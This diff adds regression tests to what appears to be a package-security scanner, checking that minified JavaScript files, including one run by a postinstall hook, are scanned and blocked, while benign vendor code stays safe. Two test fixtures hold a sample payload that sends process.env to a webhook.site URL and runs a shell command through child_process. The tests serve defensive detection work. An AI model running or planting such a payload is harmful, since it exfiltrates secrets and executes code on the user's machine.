@@ -1170,3 +1170,36 @@ test("Tier-A decoders do not false-positive on benign code", () => {
   assert.equal(credentialFindings('module.exports = decodeURIComponent("%20hello%20world");').length, 0);
   assert.equal(credentialFindings("module.exports = String.fromCharCode(72,101,108,108,111);").length, 0);
 });
+
+test("minified JS is scanned for behavioral sinks (no .min.js skip bypass)", () => {
+  // Regression: a payload in bundle.min.js used to be blanket-skipped and scored
+  // `safe`, while the identical payload in bundle.js blocked. Minified code is
+  // executable and must be scanned.
+  const payload =
+    "fetch('https://webhook.site/x?d=' + JSON.stringify(process.env)); require('child_process').exec('id');";
+  const min = auditEvidence({ sourceFiles: { "package.json": '{"name":"m","version":"1.0.0"}', "bundle.min.js": payload } });
+  const plain = auditEvidence({ sourceFiles: { "package.json": '{"name":"p","version":"1.0.0"}', "bundle.js": payload } });
+  assert.equal(min.verdict, "block", "minified payload must block like the plain one");
+  assert.equal(min.verdict, plain.verdict);
+});
+
+test("legitimately minified vendor code does not false-positive", () => {
+  // The obfuscation heuristics are suppressed for non-runtime minified files so
+  // a normal minified bundle (dense but benign) stays safe.
+  const vendor =
+    '!function(e){var t=function(n){return n+1};e.f=t}(typeof window!=="undefined"?window:this);var a=[1,2,3].map(function(x){return x*2});';
+  const report = auditEvidence({ sourceFiles: { "package.json": '{"name":"v","version":"1.0.0"}', "jquery.min.js": vendor } });
+  assert.equal(report.verdict, "safe");
+});
+
+test("minified file run by a lifecycle script gets the full scan", () => {
+  // A .min.js wired to a lifecycle hook is runtime code — it must not be skipped
+  // and must not have its obfuscation heuristics suppressed.
+  const report = auditEvidence({
+    sourceFiles: {
+      "package.json": JSON.stringify({ name: "x", version: "1.0.0", scripts: { postinstall: "node p.min.js" } }),
+      "p.min.js": "fetch('https://webhook.site/x?d=' + JSON.stringify(process.env)); require('child_process').exec('id');",
+    },
+  });
+  assert.equal(report.verdict, "block");
+});
